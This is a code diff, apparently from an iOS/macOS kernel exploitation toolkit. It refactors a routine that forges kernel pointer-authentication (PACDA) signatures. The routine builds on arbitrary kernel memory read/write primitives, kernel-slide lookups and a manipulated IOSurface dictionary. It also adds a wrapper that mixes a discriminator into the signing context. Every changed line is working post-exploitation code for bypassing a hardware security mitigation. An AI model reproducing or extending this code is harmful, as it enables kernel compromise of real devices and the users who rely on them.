@@ -357,7 +357,7 @@ uintptr_t xe_util_pacda_get_kstack_ptr(uintptr_t thread) {
     return kstackptr;
 }
 
-int xe_util_pacda_sign(uintptr_t ptr, uint64_t ctx, uintptr_t *out) {
+uintptr_t xe_util_pacda_sign(uintptr_t ptr, uint64_t ctx) {
     uintptr_t lr_kfree = xe_slider_kernel_slide(FUNC_OS_DICTIONARY_ENSURE_CAPACITY_ADDR) + LR_OS_DICT_ENSURE_CAPACITY_KFREE_OFFSET;
     xe_assert_cond(xe_kmem_read_uint32(lr_kfree - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_KFREE_TYPE_VAR_IMPL_INTERNAL_ADDR), lr_kfree - 4))
     
@@ -367,7 +367,6 @@ int xe_util_pacda_sign(uintptr_t ptr, uint64_t ctx, uintptr_t *out) {
     uintptr_t kalloc_map = xe_kmem_read_uint64(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET);
     uintptr_t kalloc_map_lck = kalloc_map + TYPE_VM_MAP_MEM_LCK_RW_OFFSET;
     
-    char* stack = NULL;
     xe_util_lck_rw_t util_lck_rw = NULL;
     
     /// STEP 1: Allocate a new IOSurface. We will be using the `props` dictionary
@@ -466,19 +465,13 @@ int xe_util_pacda_sign(uintptr_t ptr, uint64_t ctx, uintptr_t *out) {
     xe_kmem_write_uint64(dict, TYPE_OS_DICTIONARY_MEM_DICTIONARY_OFFSET, 0);
     xe_kmem_write_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET, 0);
     
-    *out = signed_ptr;
+    /// Cleanup
+    xe_util_pacda_io_surface_destroy(surface_ref);
     
     xe_log_debug("signed ptr %p, result: %p", (void*)ptr, (void*)signed_ptr);
-exit:
-    if (util_lck_rw) {
-        xe_util_lck_rw_lock_done(&util_lck_rw);
-    }
-    if (surface_ref) {
-        xe_util_pacda_io_surface_destroy(surface_ref);
-    }
-    if (stack) {
-        free(stack);
-    }
-    
-    return error;
+    return signed_ptr;
+}
+
+uintptr_t xe_util_pacda_sign_with_descriminator(uintptr_t ptr, uintptr_t ctx, uint16_t descriminator) {
+    return xe_util_pacda_sign(ptr, XE_PTRAUTH_BLEND_DISCRIMINATOR_WITH_ADDRESS(descriminator, ctx));
 }
